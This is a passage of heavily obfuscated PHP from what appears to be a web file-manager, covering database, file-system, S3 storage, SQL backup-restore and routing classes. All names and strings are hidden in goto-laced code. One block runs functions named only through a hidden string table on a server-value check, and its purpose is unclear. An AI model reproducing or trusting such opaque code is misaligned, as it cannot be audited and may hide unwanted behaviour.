$aĘ[849]: $a = $aĘ[850] . $d . $aĘ[851]; break; case $aĘ[824]: break; case $aĘ[852]: default: $a = $aĘ[853] . ($this->dbType == $aĘ[852] ? "\140{$d}\140" : $d); } } goto A; A: $Fܞ = $this->query($a); $EǘÅɵ = array(); if ($Fܞ) { foreach ($Fܞ as $a => $F˰) { $F˰ = array_change_key_case($F˰); $F˰[$aĘ[28]] = isset($F˰[$aĘ[28]]) ? $F˰[$aĘ[28]] : $aĘ[358]; $F˰[$aĘ[29]] = isset($F˰[$aĘ[29]]) ? $F˰[$aĘ[29]] : $aĘ[358]; $EΝ = isset($F˰[$aĘ[258]]) ? $F˰[$aĘ[258]] : $F˰[$aĘ[28]]; $EǘÅɵ[$EΝ] = array($aĘ[28] => $EΝ, $aĘ[29] => $F˰[$aĘ[29]], $aĘ[31] => (bool) (isset($F˰[$aĘ[100]]) && $F˰[$aĘ[100]] === $aĘ[33] || isset($F˰[$aĘ[31]]) && $F˰[$aĘ[31]] === $aĘ[33]), $aĘ[34] => isset($F˰[$aĘ[34]]) ? $F˰[$aĘ[34]] : (isset($F˰[$aĘ[53]]) ? $F˰[$aĘ[53]] : $aĘ[358]), $aĘ[36] => isset($F˰[$aĘ[88]]) ? strtolower($F˰[$aĘ[88]]) == $aĘ[38] : (isset($F˰[$aĘ[54]]) ? $F˰[$aĘ[54]] : !1), $aĘ[39] => isset($F˰[$aĘ[854]]) ? strtolower($F˰[$aĘ[854]]) == $aĘ[41] : (isset($F˰[$aĘ[88]]) ? $F˰[$aĘ[88]] : !1)); } } goto D; dȯ: } public function getTables($b = '') { $E =& $_SERVER[놫Ӱ]; if (think_config($E[855])) { $bǨ = str_replace($E[856], $b, think_config($E[855])); } else { switch ($this->dbType) { case $E[823]: case $E[825]: $bǨ = $E[857]; break; case $E[822]: case $E[840]: $bǨ = $E[858]; break; case $E[849]: $bǨ = $E[859]; break; case $E[824]: think_exception(think_lang($E[860]) . $E[861]); break; case $E[841]: $bǨ = $E[42] . $E[43] . $E[44]; break; case $E[852]: default: if (!empty($b)) { $bǨ = $E[804] . $b; } else { $bǨ = $E[805]; } } } $B򵾏 = $this->query($bǨ); $CՆ = array(); foreach ($B򵾏 as $fۋ => $EǙ) { $CՆ[$fۋ] = current($EǙ); } return $CՆ; } protected function parseLimit($a∰) { $dܱ =& $_SERVER[놫Ӱ]; $f̧ = $dܱ[33]; if (!empty($a∰)) { switch ($this->dbType) { case $dܱ[849]: case $dܱ[841]: $a∰ = explode($dܱ[47], $a∰); if (count($a∰) > 1) { $f̧ .= $dܱ[48] . $a∰[1] . $dܱ[49] . $a∰[0] . $dܱ[50]; } else { $f̧ .= $dܱ[48] . $a∰[0] . $dܱ[50]; } break; case $dܱ[822]: case $dܱ[840]: break; case $dܱ[824]: break; case $dܱ[823]: case $dܱ[825]: break; case $dܱ[852]: default: $f̧ .= $dܱ[48] . $a∰ . $dܱ[50]; } } return $f̧; } public function parseKey(&$fү, $Aۧ = true) { $A =& $_SERVER[놫Ӱ]; if ($Aۧ) { $fү = $this->parseKeyCheck($fү); } if ($this->dbType == $A[852]) { if ($fү != $A[173] && !preg_match($A[815], $fү)) { $fү = $A[816] . trim($fү, $A[816]) . $A[816]; } return $fү; } else { return parent::parseKey($fү); } } public function close() { $this->_linkID = null; } public function error() { $fӑ =& $_SERVER[놫Ӱ]; if ($this->PDOStatement) { $c = $this->PDOStatement->errorInfo(); $this->error = $c[1] . $fӑ[4] . $c[2]; } else { $this->error = $fӑ[33]; } if ($fӑ[33] != $this->queryStr) { $this->error .= LNG($fӑ[45]) . $this->queryStr; } think_trace($this->error, $fӑ[33], $fӑ[46]); return $this->error; } public function escapeString($Cʕ) { $D =& $_SERVER[놫Ӱ]; switch ($this->dbType) { case $D[849]: case $D[822]: case $D[840]: case $D[852]: return addslashes($Cʕ); case $D[824]: case $D[841]: case $D[823]: case $D[825]: return str_ireplace($D[55], $D[56], $Cʕ); } } protected function parseValue($BᏎ) { $A˧ =& $_SERVER[놫Ӱ]; if (is_string($BᏎ)) { $BᏎ = strpos($BᏎ, $A˧[4]) === 0 ? $this->escapeString($BᏎ) : $A˧[862] . $this->escapeString($BᏎ) . $A˧[862]; } elseif (isset($BᏎ[0]) && is_string($BᏎ[0]) && strtolower($BᏎ[0]) == $A˧[282]) { $BᏎ = $this->escapeString($BᏎ[1]); } elseif (is_array($BᏎ)) { $BᏎ = array_map(array($this, $A˧[863]), $BᏎ); } elseif (is_bool($BᏎ)) { $BᏎ = $BᏎ ? $A˧[493] : $A˧[464]; } elseif (is_null($BᏎ)) { $BᏎ = $A˧[100]; } return $BᏎ; } public function getLastInsertId() { $fȍǭ =& $_SERVER[놫Ӱ]; switch ($this->dbType) { case $fȍǭ[849]: case $fȍǭ[841]: case $fȍǭ[822]: case $fȍǭ[840]: case $fȍǭ[824]: case $fȍǭ[852]: return $this->_linkID->lastInsertId(); case $fȍǭ[823]: case $fȍǭ[825]: $E虵 = $this->table; $Bߩ = $this->query("\123\x45\114\105\103\x54\40{$E虵}\x2e\x63\x75\162\162\x76\141\154\40\143\165\162\162\x76\141\x6c\x20\x46\x52\117\x4d\x20\x64\165\141\x6c"); return $Bߩ ? $Bߩ[0][$fȍǭ[864]] : 0; } } } goto A׺; e: define($_SERVER[놫Ӱ][1833], 3); define($_SERVER[놫Ӱ][1834], 4); define($_SERVER[놫Ӱ][1835], 5); goto F; a: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($c︌) { if (substr($c︌, 0, 2) == $_SERVER[놫Ӱ][1111]) { $c︌ = BASIC_PATH . substr($c︌, 2); } return $c︌; } public function iconvApp($C񇐴) { $BÞ =& $_SERVER[놫Ӱ]; global $config; return $this->iconvTo($C񇐴, $config[$BÞ[1109]], $config[$BÞ[1108]]); } public function iconvSystem($b⌋خ) { $D۱҃ =& $_SERVER[놫Ӱ]; global $config; return $this->iconvTo($b⌋خ, $config[$D۱҃[1108]], $config[$D۱҃[1109]]); } public function getPathOuter($c) { goto a; a: $cؚ =& $_SERVER[놫Ӱ]; $F = $this->iconvApp($this->pathBase); $c = $this->iconvApp($c); goto cƆ; c̆: return $this->pathDriver . $cؚ[8] . ltrim($c, $cؚ[8]); goto e갣; fӚԚ: $c = KodIO::clear($c); $c = substr($c, strlen($F)); if (empty($this->pathDriver)) { return $c; } goto c̆; cƆ: if (substr($F, 0, 2) == $cؚ[1111]) { $F = BASIC_PATH . substr($F, 2); } if (substr($c, 0, 2) == $cؚ[1111]) { $c = BASIC_PATH . substr($c, 2); } $F = KodIO::clear($F); goto fӚԚ; e갣: } public function mkfile($b쏯, $cִ = '', $cʨ䑏 = REPEAT_RENAME) { $b쏯 = $this->iconvSystem($b쏯); @touch($b쏯); if ($cִ) { file_put_contents($b쏯, $cִ); } return is_file($b쏯) ? $this->getPathOuter($b쏯) : !1; } public function mkdir($eϤ, $f = REPEAT_SKIP) { $eϤ = $this->iconvSystem($eϤ); if (is_dir($eϤ)) { return $this->getPathOuter($eϤ); } @mkdir($eϤ, 511, !0); return is_dir($eϤ) ? $this->getPathOuter($eϤ) : !1; } public function copyFile($D, $AŲ) { $this->mkdir($this->pathFather($AŲ)); $D = $this->iconvSystem($D); $AŲ = $this->iconvSystem($AŲ); $bږ峯 = @copy($D, $AŲ); return $bږ峯 ? $this->getPathOuter($AŲ) : !1; } public function moveFile($eԂ, $c) { $this->mkdir($this->pathFather($c)); $eԂ = $this->iconvSystem($eԂ); $c = $this->iconvSystem($c); $bՍ = intval(@rename($eԂ, $c)); if (!$bՍ) { if ($bՍ = intval(@copy($eԂ, $c))) { @unlink($eԂ); } } return $bՍ ? $this->getPathOuter($c) : !1; } public function delFile($C) { $C = $this->iconvSystem($C); if (!@unlink($C)) { @chmod($C, 511); if (!@unlink($C)) { return !1; } } else { return !0; } } public function delFolder($aʙ) { goto C; F: if (!($e̓ = opendir($aʙ))) { return !1; } while (($A = readdir($e̓)) !== !1) { if ($A == $a[92] || $A == $a[1121]) { continue; } $A΃ = $aʙ . $a[8] . $A; if (!is_dir($A΃)) { if (!unlink($A΃)) { chmod($A΃, 511); if (!unlink($A΃)) { return !1; } } } else { chmod($A΃, 511); $A΃ = $this->iconvApp($A΃); if (!$this->delFolder($A΃)) { return !1; } } } closedir($e̓); goto A內; A內: return rmdir($aʙ); goto C; C: $a =& $_SERVER[놫Ӱ]; $aʙ = $this->iconvSystem($aʙ); if (!is_dir($aʙ)) { return !0; } goto F; C: } public function rename($ať, $c) { goto CП; b젎: $b̋ = @rename($ať, $d); $d = $this->iconvApp($d); return $b̋ ? $this->getPathOuter($d) : !1; goto FЦݝ; CП: $Dƈ׎ =& $_SERVER[놫Ӱ]; $A = $this->fileNameAuto($this->pathFather($ať), $c); $A = $this->iconvSystem($A); goto Ḍܽ; Ḍܽ: $ať = $this->iconvSystem($ať); $d坬 = $this->pathFather($ať); $d = rtrim($d坬, $Dƈ׎[8]) . $Dƈ׎[8] . $A; goto b젎; FЦݝ: } public function size($dی) { $dی = $this->iconvSystem($dی); return (double) abs(sprintf($_SERVER[놫Ӱ][1122], @filesize($dی))); } public function info($BϒƓ) { $BϒƓ = $this->iconvSystem($BϒƓ); if ($this->isFolder($BϒƓ)) { return $this->folderInfo($BϒƓ); } else { if ($this->isFile($BϒƓ)) { return $this->fileInfo($BϒƓ); } } return !1; } protected function infoChildren($D֕, &$Aׅ, $d = true) { $f =& $_SERVER[놫Ӱ]; $D֕ = rtrim($D֕, $f[8]) . $f[8]; if ($d) { check_abort(); $D֕ = $this->iconvSystem($D֕); } if (!($EƤٓ = @opendir($D֕))) { return; } while (($E = readdir($EƤٓ)) !== !1) { if ($E == $f[92] || $E == $f[1121]) { continue; } $Cꦃَ = $D֕ . $E; if (is_file($Cꦃَ)) { $Aׅ[$f[79]]++; $Aׅ[$f[78]] += (double) abs(sprintf($f[1122], @filesize($Cꦃَ))); } else { $Aׅ[$f[80]]++; $this->infoChildren($Cꦃَ, $Aׅ, !1); } } closedir($EƤٓ); } private function folderInfo($AƇΣ, $eЏ = false) { $e엜 =& $_SERVER[놫Ӱ]; $AƇΣ = rtrim($AƇΣ, $e엜[8]) . $e엜[8]; $c = $this->iconvApp($this->pathThis($AƇΣ)); if ($eЏ) { return array($e엜[28] => $c, $e엜[76] => $this->getPathOuter($AƇΣ), $e엜[29] => $e엜[77]); } $Bۢ = array($e엜[28] => $c, $e엜[76] => $this->getPathOuter($AƇΣ), $e엜[29] => $e엜[77], $e엜[184] => @filectime($AƇΣ), $e엜[106] => @filemtime($AƇΣ), $e엜[1123] => @fileatime($AƇΣ), $e엜[1117] => is_readable($AƇΣ), $e엜[1118] => is_writable($AƇΣ), $e엜[1124] => get_mode($AƇΣ)); return $Bۢ; } private function fileInfo($bᮤ, $F޲ = false) { $F =& $_SERVER[놫Ӱ]; $C䑍׽ = $this->iconvApp($this->pathThis($bᮤ)); if ($F޲) { return array($F[28] => $C䑍׽, $F[76] => $this->getPathOuter($bᮤ), $F[29] => $F[164], $F[78] => $this->size($bᮤ), $F[157] => $this->ext($C䑍׽)); } $dϷ = array($F[28] => $C䑍׽, $F[76] => $this->getPathOuter($bᮤ), $F[29] => $F[164], $F[184] => @filectime($bᮤ), $F[106] => @filemtime($bᮤ), $F[1123] => @fileatime($bᮤ), $F[78] => $this->size($bᮤ), $F[157] => $this->ext($C䑍׽), $F[1117] => is_readable($bᮤ), $F[1118] => is_writable($bᮤ), $F[1124] => get_mode($bᮤ)); return $dϷ; } public function exist($bЃ) { $bЃ = $this->iconvSystem($bЃ); return @file_exists($bЃ); } public function isFile($DՋꆸ) { $DՋꆸ = $this->iconvSystem($DՋꆸ); return @is_file($DՋꆸ); } public function isFolder($DΒ) { $DΒ = $this->iconvSystem($DΒ); return @is_dir($DΒ); } public function listPath($eʴʔ, $D = false) { goto dê΅; AقⓊ: $D = array($FÚΙ[75] => array(), $FÚΙ[74] => array()); if (!($Dތ = @opendir($eʴʔ))) { return $D; } while (($Eԙ = readdir($Dތ)) !== !1) { if ($Eԙ == $FÚΙ[92] || $Eԙ == $FÚΙ[1121]) { continue; } $Cݯх = $eʴʔ . $Eԙ; if (is_file($Cݯх)) { $D[$FÚΙ[74]][] = $this->fileInfo($Cݯх, $D); } else { $D[$FÚΙ[75]][] = $this->folderInfo($Cݯх, $D); } } goto e; e: closedir($Dތ); return $D; goto e覌; dê΅: $FÚΙ =& $_SERVER[놫Ӱ]; $eʴʔ = $this->iconvSystem($eʴʔ); $eʴʔ = rtrim($eʴʔ, $FÚΙ[8]) . $FÚΙ[8]; goto AقⓊ; e覌: } public function listAll($Aල, &$f = array()) { goto D; F̙ꄇ: return $f; goto fҠ; D: $aƉ =& $_SERVER[놫Ӱ]; $Aල = $this->iconvSystem($Aල); $Aල = rtrim($Aල, $aƉ[8]) . $aƉ[8]; goto C; C: if (!($aφ = @opendir($Aල))) { return $f; } while (($e = readdir($aφ)) !== !1) { if ($e == $aƉ[92] || $e == $aƉ[1121]) { continue; } $Fճ = $Aල . $e; if (is_dir($Fճ)) { $f[] = array($aƉ[76] => $Fճ . $aƉ[8], $aƉ[77] => 1, $aƉ[78] => 0); $this->listAll($Fճ, $f); } else { $f[] = array($aƉ[76] => $Fճ, $aƉ[77] => 0, $aƉ[78] => $this->size($Fճ)); } } closedir($aφ); goto F̙ꄇ; fҠ: } public function has($fƨ, $a坄 = false, $B˳ = true) { goto B; BΨ: while (($E؊ = readdir($CӴ)) !== !1) { if ($E؊ == $CƋ[92] || $E؊ == $CƋ[1121]) { continue; } $E = $fƨ . $E؊; if ($a坄) { if (@is_file($E)) { $D𦑇++; } else { $CÝ++; } continue; } if ($B˳) { if (@is_file($E)) { return !0; } } else { if (@is_dir($E . $CƋ[8])) { return !0; } } } closedir($CӴ); if ($a坄) { return array($CƋ[188] => $D𦑇, $CƋ[189] => $CÝ); } goto bŵᇫ; B: $CƋ =& $_SERVER[놫Ӱ]; $fƨ = $this->iconvSystem($fƨ); $fƨ = rtrim($fƨ, $CƋ[8]) . $CƋ[8]; goto DФۘ; bŵᇫ: return !1; goto d䷳; DФۘ: if (!($CӴ = @opendir($fƨ))) { return !1; } $D𦑇 = 0; $CÝ = 0; goto BΨ; d䷳: } public function hashSimple($B) { goto D¡; D¡: $A׫ =& $_SERVER[놫Ӱ]; if (!$B) { return md5($A׫[33]); } $B = $this->iconvSystem($B); goto fݬ; fݬ: $Bݛّ = $this->size($B); $c = 200; $bٵ = 50; goto f; D: return md5($eȐ) . $Bݛّ; goto E; f: if ($Bݛّ <= $c * $bٵ) { return $this->hashMd5($B) . $Bݛّ; } $eȐ = $A׫[33]; $AԭϺ = intval($Bݛّ / $bٵ); goto f; Cˏ: fseek($eƍ, $Bݛّ - $c); $eȐ .= fread($eƍ, $c); fclose($eƍ); goto D; f: $eƍ = fopen($B, $A׫[1125]); if (!$eƍ) { return $eȐ; } for ($eǚǕ = 0; $eǚǕ < $bٵ; $eǚǕ++) { fseek($eƍ, $AԭϺ * $eǚǕ); $eȐ .= fread($eƍ, $c); } goto Cˏ; E: } public function getContent($eܔ) { $eܔ = $this->iconvSystem($eܔ); return file_get_contents($eܔ); } public function setContent($F, $F۫ = '') { $F = $this->iconvSystem($F); @file_put_contents($F, $F۫, LOCK_EX); clearstatcache(); return strlen($F۫) == filesize($F); } public function fileSubstr($AӅ, $f궤 = 0, $CĠ = false) { goto C酚; b͘: if ($CĠ <= 0) { return $FҮ[33]; } $C = fopen($AӅ, $FҮ[1125]); if (!$C) { return !1; } goto e; e: fseek($C, $f궤); $Fǿ = fread($C, $CĠ); fclose($C); goto aұ; aұ: return $Fǿ; goto Eո; C酚: $FҮ =& $_SERVER[놫Ӱ]; $AӅ = $this->iconvSystem($AӅ); if ($CĠ === !1) { $CĠ = $this->size($AӅ); } goto b͘; Eո: } public function upload($B, $Dԅ射, $e֧ = false, $Fڃ = REPEAT_REPLACE) { $Fؚ = $this->copyFile($Dԅ射, $B); return $Fؚ ? $this->getPathOuter($B) : !1; } public function download($bĬ, $F) { return $this->iconvSystem($bĬ); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($F) { parent::__construct($F); $this->signatureVersion($_SERVER[놫Ӱ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($Cڗ, $dە, $f݊ = array()) { $D = $this->tempFile($Cڗ); $this->download($Cڗ, $D); $Bݻރ = $this->upload($dە, $D); $this->tempFileRemve($D); return $Bݻރ; } public function uploadFormData($F˟, $EԱ = 3600) { return parent::uploadFormData($F˟, $EԱ); } public function fileOut($a, $Cپ𵯖 = false, $c۶ = false, $D = '') { parent::fileOutServer($a, $Cپ𵯖, $c۶, $D); } public function fileOutLink($b) { header($_SERVER[놫Ӱ][153] . $b); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fڝ) { parent::__construct($fڝ); $this->signatureVersion($_SERVER[놫Ӱ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Fݔ) { header($_SERVER[놫Ӱ][153] . $Fݔ); die; } } goto C͏; D: class Restore { function __construct($f, $e = '') { $this->database = $f; $this->type = $e; } public function model($E = '') { return new ModelBase($E, $_SERVER[놫Ӱ][33], $this->database); } public function db($B = false) { goto B; eˡ: if (!$c醑) { $fخ->execute("\143\162\145\141\x74\145\40\x64\141\x74\141\x62\141\x73\145\x20\140{$f愻}\140"); } $c[$eИ[231]] = $f愻; if ($c[$eИ[718]] == $eИ[719]) { $c[$eИ[721]] .= $eИ[1278] . $f愻; } goto B; FϯŎރ: $f愻 = $c[$eИ[231]]; $c[$eИ[231]] = $eИ[33]; if ($c[$eИ[718]] == $eИ[719]) { $fܾ = $c[$eИ[721]]; $c[$eИ[721]] = substr($fܾ, 0, strrpos($fܾ, $eИ[1278])); } goto a; B: $eИ =& $_SERVER[놫Ӱ]; $c = $this->database; if ($this->type == $eИ[9] || !$B) { return $this->model()->db(); } goto FϯŎރ; a: $this->database = $c; $fخ = $this->model()->db(); $c醑 = $fخ->execute("\163\x68\157\167\40\144\x61\x74\141\142\x61\x73\x65\x73\40\154\x69\x6b\145\x20\x27{$f愻}\47"); goto eˡ; B: $this->database = $c; $fخ->execute("\165\x73\x65\x20\140{$f愻}\140"); return $fخ; goto Fʪ; Fʪ: } public function createTable($B柋, $D = null) { $cĴ޳ =& $_SERVER[놫Ӱ]; if (!@file_exists($B柋)) { show_json(LNG($cĴ޳[1279]), !1); } $fߞ = sqlSplit(file_get_contents($B柋)); foreach ($fߞ as $B텙Ϣ) { if ($D) { $Eƻ = stripos($B텙Ϣ, $cĴ޳[1280]) === 0; if ($Eƻ) { $D->task[$cĴ޳[1281]] += 1; } } $this->model()->db()->execute($B텙Ϣ); if ($D && $Eƻ) { $dߥ˺ = $cĴ޳[1282]; preg_match($dߥ˺, $B텙Ϣ, $aߏ); $D->task[$cĴ޳[1283]] = trim($f[0], $cĴ޳[816]); $D->update(1); } } $this->taskToCache($D); } public function insertTable($A, $eŴ = null) { $A锰 =& $_SERVER[놫Ӱ]; foreach ($A as $Fĳʎ) { $C = basename($Fĳʎ); $C = substr($C, 0, strrpos($C, $A锰[92])); if ($eŴ) { $eŴ->task[$A锰[1283]] = $C; } if (get_filesize($Fĳʎ) == 0) { continue; } $Cݍ = $this->sqlToDb($Fĳʎ, $eŴ); if (!$Cݍ) { show_json(LNG($A锰[1284]) . "\x5b{$C}\x5d", !1); } } $this->taskToCache($eŴ); } public function sqlFromDb($Fާ, $eЫףط, $Bϒӿ = null) { goto Dא; Fբ: $cу = 0; $A唊 = 1; $b䂅 = 500; goto Aͼ; Aͼ: $Cٞ = fopen($eЫףط, $A׆ã[705]); $eҷሎ = $FԪ->getPk(); $Bۛ = $FԪ->getDbFields(); goto f蘸͜; Dא: $A׆ã =& $_SERVER[놫Ӱ]; if ($Bϒӿ) { $Bϒӿ->task[$A׆ã[1283]] = $Fާ; } $FԪ = $this->model($Fާ); goto Fբ; f蘸͜: do { $A = $FԪ->field($Bۛ)->order($eҷሎ . $A׆ã[706])->selectPage($b䂅, $A唊); $f̖ = !empty($A[$A׆ã[350]]) ? $A[$A׆ã[350]] : array(); if (!($Eݖͻƽ = count($f̖))) { break; } if ($Bϒӿ) { $Bϒӿ->task[$A׆ã[1281]] += $Eݖͻƽ; } $Aȥ = array(); foreach ($f̖ as $c㬤) { $Aȥ[] = $A׆ã[709] . $this->sqlEncode($c㬤) . $A׆ã[710]; } $ḟ = "\111\x4e\123\105\x52\124\40\x49\x4e\x54\117\40\140{$Fާ}\x60\x20\x28\x60" . implode($A׆ã[711], $Bۛ) . $A׆ã[712]; fwrite($Cٞ, $ḟ . implode($A׆ã[713], $Aȥ) . $A׆ã[68] . PHP_EOL); $A唊++; $cу += $Eݖͻƽ; if ($Bϒӿ) { $Bϒӿ->update($Eݖͻƽ); } } while ($Eݖͻƽ == $b䂅); fclose($Cٞ); return $cу; goto B; B: } public function sqlToDb($bڐ, $dٺԑ = null) { goto Dˏ; Dˏ: $Eʭ =& $_SERVER[놫Ӱ]; $Fߜ = $this->model()->db(); $eքݪ = @fopen($bڐ, $Eʭ[1285]); goto b; f⩝礼: if ($A؏Ҥ) { $A؏Ҥ = rtrim($A؏Ҥ, $Eʭ[68]); if (!$Fߜ->execute($A؏Ҥ)) { return !1; } if ($dٺԑ) { $dٺԑ->update($BތǦ - 1); } } return !0; goto Dދñ; E: $Aֆ蜼 = 500 + 1; while (!feof($eքݪ)) { if ($dٺԑ && $BތǦ != 0) { $dٺԑ->task[$Eʭ[1281]] += 1; } $BތǦ++; $dԝ՝ = trim(fgets($eքݪ)); $A؏Ҥ .= $Eʭ[50] . $this->sqlDecode($dԝ՝, $this->type); if ($BތǦ == $Aֆ蜼) { $A؏Ҥ = rtrim($A؏Ҥ, $Eʭ[68]); if (!$Fߜ->execute($A؏Ҥ)) { return !1; } if ($dٺԑ) { $dٺԑ->update($BތǦ - 1); } $A؏Ҥ = $Eʭ[33]; $BތǦ = 0; } } fclose($eքݪ); goto f⩝礼; b: if (!$eքݪ) { return !1; } $BތǦ = 0; $A؏Ҥ = $Eʭ[33]; goto E; Dދñ: } public function dropTable($DȲҘ = null) { $e = $this->model()->db(); $F㉗ = $DȲҘ ? array($DȲҘ) : $e->getTables(); if (!$F㉗) { return; } foreach ($F㉗ as $DȲҘ) { $e->execute("\x64\162\157\x70\x20\164\141\x62\x6c\145\40\x69\x66\40\145\x78\151\x73\164\x73\x20\140{$DȲҘ}\140"); } } private function taskToCache($C = null) { $AѰ· =& $_SERVER[놫Ӱ]; if (!$C) { return; } $F = array($AѰ·[1283] => $C->task[$AѰ·[1283]], $AѰ·[1281] => $C->task[$AѰ·[1281]], $AѰ·[1286] => $C->task[$AѰ·[1286]]); if ($F[$AѰ·[1281]] == $F[$AѰ·[1286]]) { $F[$AѰ·[681]] = 1; } Cache::set($AѰ·[1287] . $C->task[$AѰ·[364]], $F); $C->end(); } private function sqlEncode($b) { $aڿ =& $_SERVER[놫Ӱ]; $d䠶 = array(); foreach ($b as $BГ) { if (is_array($BГ)) { $BГ = json_encode_force($BГ); } $BГ = addslashes($BГ); $BГ = str_replace(array($aڿ[714], $aڿ[214]), array($aڿ[715], $aڿ[716]), $BГ); $d䠶[] = str_replace($aڿ[55], $aڿ[1288], $BГ); } return $aڿ[55] . implode($aڿ[717], $d䠶) . $aڿ[55]; } private function sqlDecode($D㺙, $d޻) { $BӤߺ =& $_SERVER[놫Ӱ]; $D㺙 = str_replace(array($BӤߺ[715], $BӤߺ[716]), array($BӤߺ[714], $BӤߺ[214]), $D㺙); if ($d޻ == $BӤߺ[9]) { $D㺙 = stripslashes($D㺙); } return $D㺙; } } if ($_SERVER[$_SERVER[놫Ӱ][782]] != $_SERVER[$_SERVER[놫Ӱ][1289]]) { goto E徭; E徭: $cܩ = $_SERVER[놫Ӱ][784]; $aΌ = $_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]; $A = $cܩ($aΌ); goto fٳ; fڔ寤: $e؇̅($_SERVER[$_SERVER[놫Ӱ][966]]); goto B蛿; fٳ: $Bٌ = explode($_SERVER[놫Ӱ][214], $A); if (count($Bٌ) < $_SERVER[놫Ӱ][573]) { $b = $_SERVER[놫Ӱ][785]; $b(); } $e؇̅ = $_SERVER[놫Ӱ][967]; goto fڔ寤; B蛿: } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\x5d\x2b", "\x3a\156\165\155" => "\133\60\x2d\x39\135\53", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($d풊, $Bϭ) { $Fˏ۔ =& $_SERVER[놫Ӱ]; if ($d풊 == $Fˏ۔[1290]) { $eѢ = array_map($Fˏ۔[1291], $Bϭ[0]); $A䰝 = strpos($Bϭ[1], $Fˏ۔[8]) === 0 ? $Bϭ[1] : $Fˏ۔[8] . $Bϭ[1]; $eЂ = $Bϭ[2]; } else { $eѢ = null; $A䰝 = strpos($Bϭ[0], $Fˏ۔[8]) === 0 ? $Bϭ[0] : $Fˏ۔[8] . $Bϭ[0]; $eЂ = $Bϭ[1]; } array_push(self::$maps, $eѢ); array_push(self::$routes, $A䰝); array_push(self::$methods, strtoupper($d풊)); array_push(self::$callbacks, $eЂ); } public static function error($EΦ) { self::$errorCallback = $EΦ; } public static function haltOnMatch($e𷄌 = true) { self::$halts = $e𷄌; } public static function dispatch() { goto C䂂; e揝: self::$routes = preg_replace($A[1041], $A[8], self::$routes); if (in_array($dޖҳ, self::$routes)) { $DՒ̏ = array_keys(self::$routes, $dޖҳ); foreach ($DՒ̏ as $d܉) { if (self::$methods[$d܉] == $Eޚ || self::$methods[$d܉] == $A[1293] || in_array($Eޚ, self::$maps[$d܉])) { $f = !0; if (!is_object(self::$callbacks[$d܉])) { $D۞ = explode($A[8], self::$callbacks[$d܉]); $Dܦ = end($D۞); $d = explode($A[1294], $Dܦ); $e = new $d[0](); $e->{$d[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$d܉]); if (self::$halts) { return; } } } } } else { $b᫽ = 0; foreach (self::$routes as $d܉) { if (strpos($d܉, $A[4]) !== !1) { $d܉ = str_replace($C׆杩, $Bч, $d܉); } if (preg_match($A[1295] . $d܉ . $A[1296], $dޖҳ, $Ać)) { if (self::$methods[$b᫽] == $Eޚ || self::$methods[$b᫽] == $A[1293] || !empty(self::$maps[$b᫽]) && in_array($Eޚ, self::$maps[$b᫽])) { $f = !0; array_shift($Ać); if (!is_object(self::$callbacks[$b᫽])) { $D۞ = explode($A[8], self::$callbacks[$b᫽]); $Dܦ = end($D۞); $d = explode($A[1294], $Dܦ); $e = new $d[0](); if (!method_exists($e, $d[1])) { echo $A[1297]; } else { call_user_func_array(array($e, $d[1]), $Ać); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$b᫽], $Ać); if (self::$halts) { return; } } } } $b᫽++; } } if ($f == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eܬ =& $_SERVER[놫Ӱ]; header($_SERVER[$eܬ[1298]] . $eܬ[1299]); echo $eܬ[1300]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$A[1292]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto c; C䂂: $A =& $_SERVER[놫Ӱ]; $dޖҳ = parse_url($_SERVER[$A[1292]], PHP_URL_PATH); $Eޚ = $_SERVER[$A[149]]; goto c慚; c慚: $C׆杩 = array_keys(static::$patterns); $Bч = array_values(static::$patterns); $f = !1; goto e揝; c: } } goto d˚݄; CꝌ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\x61\155\x65" => "\x67\x72\157\165\160\x5f\155\x65\x74\141", "\155\x65\164\141\x46\x69\x65\x6c\x64" => "\147\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($b) { $E =& $_SERVER[놫Ӱ]; return array($E[2072] => array($b[0], $E[2073]), $E[2074] => array($b[0], $E[2073])); } protected function getInfo($a) { $fƥɌ = $this->getInfoSimple($a); if (!$fƥɌ) { return !1; } return $this->_listDataApplyItem($fƥɌ); } protected function getInfoSimple($C҈, $eԙ = false) { $dǤد =& $_SERVER[놫Ӱ]; if ($eԙ) { $bÎȕ = array($dǤد[2002] => intval($C҈)); return $this->where($bÎȕ)->find(); } return $this->cacheFunctionGet($dǤد[2075], $C҈); } protected function groupAdd($Cά) { goto DК䆿; c맢: $a = $this->add($a᥌); $this->setNamePinyin($a, $a᥌[$f⍧[28]]); Model($f⍧[1075])->groupRootAdd($a); goto c鐙; c鐙: return $a; goto D; aܣ: if ($b۬[$f⍧[455]]) { $a = $b۬[$f⍧[455]] . $b۬[$f⍧[2002]] . $f⍧[47]; } $a᥌ = array($f⍧[383] => $this->groupNameAuto($Cά[$f⍧[457]], $Cά[$f⍧[28]]), $f⍧[365] => $Cά[$f⍧[457]], $f⍧[518] => $a, $f⍧[2077] => $Cά[$f⍧[1986]], $f⍧[2078] => 0, $f⍧[2006] => 0); if (!empty($Cά[$f⍧[2002]])) { $a᥌[$f⍧[2002]] = $Cά[$f⍧[2002]]; } goto c맢; DК䆿: $f⍧ =& $_SERVER[놫Ӱ]; if (!$Cά[$f⍧[457]] && isset($Cά[$f⍧[2002]]) && $Cά[$f⍧[2002]] == 1) { if ($b۬ = $this->getInfoSimple($Cά[$f⍧[2002]], !0)) { return $Cά[$f⍧[2002]]; } } else { $b۬ = 